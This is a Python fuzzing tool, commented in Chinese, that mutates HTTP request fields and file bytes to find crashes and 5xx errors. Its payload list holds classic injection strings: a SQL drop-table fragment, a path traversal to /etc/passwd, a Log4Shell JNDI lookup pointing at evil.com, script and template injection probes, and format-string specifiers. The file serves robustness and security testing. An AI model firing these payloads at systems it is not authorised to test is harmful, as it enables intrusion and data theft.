# SPDX-License-Identifier: MIT
"""
模糊测试（Fuzzing）- 随机/变异输入探测崩溃 + 异常处理
被引用方：安全测试 / 健壮性测试

支持：
- HTTP 接口字段 fuzz
- 文件解析 fuzz
- 字符串/二进制变异
"""
import json
import logging
import random
import string
from pathlib import Path
from typing import Callable, Dict, List, Optional

import requests

logger = logging.getLogger(__name__)


# ===== Payload 生成器 =====

PAYLOAD_LIBRARY = {
    "long_string": ["A" * 10**4, "A" * 10**6],
    "null_byte": ["", None, "\x00"],
    "special_chars": [
        "<script>",
        "'; DROP TABLE--",
        "../../etc/passwd",
        "${jndi:ldap://evil.com/x}",
        "{{7*7}}",
        "%n%s%x",
    ],
    "unicode": ["☃", "💀", "𝕬", "‮", "\x00"],
    "large_numbers": [2**63, -(2**63), 1e308, float("inf"), float("nan")],
    "boolean_quirks": [True, False, "true", "false", 0, 1, "0", "1"],
    "empty_collections": [[], {}, ""],
    "deeply_nested": ["{" * 100 + "}" * 100],
}
ALL_PAYLOADS: list = [v for vals in PAYLOAD_LIBRARY.values() for v in vals]


def random_string(length: int = 100, charset: str = string.printable) -> str:
    return "".join(random.choices(charset, k=length))


def mutate(value):
    """对值做随机变异"""
    strategies = [
        lambda v: random_string(random.randint(0, 1000)),
        lambda v: random.choice(ALL_PAYLOADS),
        lambda v: bytes([random.randint(0, 255) for _ in range(100)]),
    ]
    return random.choice(strategies)(value)


# ===== HTTP fuzz =====


def fuzz_http_endpoint(
    url: str, method: str = "POST", fields: Optional[Dict] = None, iterations: int = 100, timeout: int = 10
) -> Dict:
    """
    向接口反复发送变异 payload，统计响应码 + 异常。
    fields: 基础字段示例 {"username": "alice", "age": 18}
    """
    fields = fields or {}
    statuses: Dict[int, int] = {}
    crashes: List[Dict] = []
    timeouts = 0

    for i in range(iterations):
        payload = {k: mutate(v) for k, v in fields.items()}
        # 加入纯 garbage payload
        payload["__fuzz__"] = random.choice(ALL_PAYLOADS)
        try:
            r = requests.request(method, url, json=payload, timeout=timeout)
            statuses[r.status_code] = statuses.get(r.status_code, 0) + 1
            # 5xx 视为可疑
            if 500 <= r.status_code < 600:
                crashes.append({"iter": i, "status": r.status_code, "payload_sample": str(payload)[:200]})
        except requests.exceptions.Timeout:
            timeouts += 1
        except Exception as e:
            crashes.append({"iter": i, "error": str(e)[:200]})

    return {
        "url": url,
        "iterations": iterations,
        "status_distribution": statuses,
        "crashes_5xx_or_exception": len(crashes),
        "timeouts": timeouts,
        "crash_samples": crashes[:10],
        "vulnerability": len(crashes) > 0,
    }


# ===== 文件解析 fuzz =====


def fuzz_file_parser(parser_func: Callable, base_file: bytes, iterations: int = 50) -> Dict:
    """
    对文件解析函数做变异 fuzz。parser_func 接受 bytes，返回任意。
    """
    crashes = []
    for i in range(iterations):
        # 字节级变异
        mutated = bytearray(base_file)
        for _ in range(random.randint(1, 20)):
            idx = random.randint(0, max(len(mutated) - 1, 0))
            mutated[idx] = random.randint(0, 255)
        try:
            parser_func(bytes(mutated))
        except Exception as e:
            crashes.append({"iter": i, "exception": type(e).__name__, "msg": str(e)[:200]})
    return {"iterations": iterations, "crashes": len(crashes), "samples": crashes[:10]}


if __name__ == "__main__":
    import argparse

    logging.basicConfig(level=logging.INFO)
    parser = argparse.ArgumentParser(description="Fuzzing 工具")
    sub = parser.add_subparsers(dest="cmd")
    ht = sub.add_parser("http")
    ht.add_argument("url")
    ht.add_argument("--method", default="POST")
    ht.add_argument("--iter", type=int, default=100)
    args = parser.parse_args()
    if args.cmd == "http":
        result = fuzz_http_endpoint(args.url, args.method, fields={"input": "x"}, iterations=args.iter)
        print(json.dumps(result, indent=2, ensure_ascii=False))
